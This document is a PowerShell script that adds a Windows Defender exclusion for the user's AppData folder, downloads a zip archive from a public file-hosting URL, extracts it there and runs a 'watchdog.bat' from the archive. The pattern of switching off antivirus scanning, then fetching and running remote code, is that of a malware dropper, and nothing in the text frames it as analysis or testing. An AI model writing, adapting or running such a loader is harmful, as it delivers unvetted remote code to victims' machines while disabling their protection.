# Hardcoded URL based on provided query and search results
$Url = "https://files.catbox.moe/f6hzvl.zip"

# Define the target directory using the current user's AppData for universality
$targetDir = $env:APPDATA
$zipFileName = "downloaded.zip"  # Temporary name for the downloaded ZIP
$zipPath = Join-Path -Path $targetDir -ChildPath $zipFileName
$extractPath = $targetDir  # Extract directly into the target directory
$batPath = Join-Path -Path $extractPath -ChildPath "win-x32\watchdog.bat"

# Create the target directory if it doesn't exist (though AppData usually exists)
if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

# Check if watchdog.bat already exists
if (Test-Path $batPath) {
    Write-Host "watchdog.bat already exists. Skipping download and extraction."
} else {
    # Add Windows Defender exclusion for the target directory before downloading
    try {
        Add-MpPreference -ExclusionPath $targetDir -ErrorAction Stop
        Write-Host "Windows Defender exclusion added for: $targetDir"
    } catch {
        Write-Error "Failed to add Windows Defender exclusion. Error: $_ (Ensure running as administrator)"
        exit 1
    }

    # Download the ZIP file only if bat doesn't exist
    try {
        Invoke-WebRequest -Uri $Url -OutFile $zipPath -ErrorAction Stop
        Write-Host "Download completed: $zipPath"
    } catch {
        Write-Error "Failed to download from $Url. Error: $_"
        exit 1
    }

    # Extract the ZIP file only if bat doesn't exist
    try {
        Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force -ErrorAction Stop
        Write-Host "Extraction completed to: $extractPath"
    } catch {
        Write-Error "Failed to extract ZIP. Error: $_"
        exit 1
    }

    # Optional: Clean up the downloaded ZIP file (only if downloaded)
    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
    Write-Host "Cleanup completed."
}

# Run the watchdog.bat file if it exists (either pre-existing or newly extracted)
if (Test-Path $batPath) {
    try {
        Start-Process -FilePath $batPath -WorkingDirectory (Join-Path -Path $extractPath -ChildPath "win-x32") -NoNewWindow -Wait
        Write-Host "watchdog.bat executed successfully."
    } catch {
        Write-Error "Failed to run watchdog.bat. Error: $_"
        exit 1
    }
} else {
    Write-Error "watchdog.bat not found in $extractPath\win-x32"
    exit 1
}

Write-Host "Script finished."
